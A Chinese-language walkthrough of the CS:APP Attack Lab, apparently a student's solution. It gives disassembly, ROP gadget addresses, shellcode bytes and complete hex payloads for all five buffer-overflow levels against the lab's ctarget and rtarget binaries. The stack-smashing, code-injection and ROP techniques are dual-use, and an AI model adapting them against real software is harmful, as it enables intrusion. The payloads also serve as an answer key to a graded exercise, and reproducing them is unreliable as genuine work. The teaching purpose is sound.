# Attack Lab

配合[文档](http://csapp.cs.cmu.edu/3e/attacklab.pdf)食用效果更佳

## code injection

代码注入攻击

### level1

> 需要返回到touch1函数

getbuf函数中存在溢出，gdb看一下汇编

```assembly
   0x00000000004017a8 <+0>:	sub    rsp,0x28
   0x00000000004017ac <+4>:	mov    rdi,rsp
   0x00000000004017af <+7>:	call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    eax,0x1
   0x00000000004017b9 <+17>:	add    rsp,0x28
   0x00000000004017bd <+21>:	ret    
```

padding长度为0x28，填充到rip处加上touch1的地址，ret将touch1的地址弹入rip中，即可劫持执行流

于是我们payload的构造为

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

运行程序

```shell
./hex2raw < 1.txt | ./ctarget -q
```

### level2

> 需要返回到touch2函数中，并且touch2函数的第一个参数需要为cookie
>
> 我这里cookie=0x59b997fa

#### rop

后续传参需要，先找好gadaget

gadget

```assembly
0x000000000040141b : pop rdi ; ret
```

rop链的构造

```bash
padding+pop_rdi+cookie+touch2
```

payload 

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
1b 14 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
ec 17 40 00 00 00 00 00
```

这是rop链的做法

#### code injection

因为栈地址不变

可以在栈顶注入机器码，就像shellcode一样

shellcode

```assembly
movq  $0x59b997fa,%rdi
pushq $0x004017ec         
retq  
```

```assembly
48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
68 ec 17 40 00       	pushq  $0x4017ec
c3                   	retq   
```

payload

```bash
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

### level3

> 需要劫持执行流到touch3函数

和上题的思路类似，在栈上布置shellcode并劫持执行流到shellcode

观察源代码，需要我们讲cookie以字符串的形式作为参数传入touch3函数

shellcode

```bash
0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
7:	68 fa 18 40 00       	pushq  $0x4018fa
c:	c3                   	retq   
```

需要注意一点，如果将cookie布置在栈顶，下面的函数执行时会破坏getbuf函数的栈桢，导致cookie丢失，所以我选择布置在返回地址的下面(0x5561dca8)

payload

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
88 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

## ROP

rop攻击

题目提供了一些gadget在farm.c中

最好用题目提供的gadget

### level4

题目的要求和level2中的一样，不过我们需要通过构造rop链的手法去完成攻击

执行touch2(cookie)

我这里用了两个gadget

#### gadget1

```assembly
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq
```

取后面的58 90 c3

```assembly
0x4019ab: 58 90 c3 pop %rax; nop; retq
```

#### gadget2

```assembly
0x4019a2 mov rdi,rax ; ret;
```

rop链:gadget1+cookie+gadget2+touch2

payload

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

### level5

需求和level3一样，不过难点在于栈地址不固定，如何把cookie的地址传入touch3中是一个问题

我的解决方案是将rsp传入rax中，用add_xy函数计算出我们放置cookie的地址，最后再传入touch3函数中

似乎只能用他给的gadget，我自己跑了一个rop链最后程序直接crush了(里面其他其他的gadget)，后来自己又写了一个

gadget

```assembly
00000000004019d6 <add_xy>:
  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
  4019da: c3                    retq 
```

```assembly
0x4019a2:
48 89 c7  :     								mov rdi rax
c3				:											ret	
```

```assembly
401a06:	48 89 e0      					mov rax rsp
401a09: c3  										ret
```

```assembly
0x401a42 <addval_487+2>:	mov    edx,eax
0x401a44 <addval_487+4>:	test   al,al
0x401a46 <addval_487+6>:	ret  
```

```assembly
0x401a69 <getval_311+1>:	mov    ecx,edx
0x401a6b <getval_311+3>:	or     bl,bl
0x401a6d <getval_311+5>:	ret
```

```assembly
0x401a27 <addval_187+2>:	mov    esi,ecx
0x401a29 <addval_187+4>:	cmp    al,al
0x401a2b <addval_187+6>:	ret   
```

```assembly
0x4019cc <getval_280+2>:	pop    rax
0x4019cd <getval_280+3>:	nop
0x4019ce <getval_280+4>:	ret   
```

rop chain

```assembly
mov rax, rsp ; ret
mov rdi, rax ; ret
pop rax; ret
0x48
mov eax,edx;
mov ecx,edx;
mov esi,ecx;
add_xy
mov rdi, rax ; ret
touch3
cookie
```

paylaod

```bash
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61 00
```

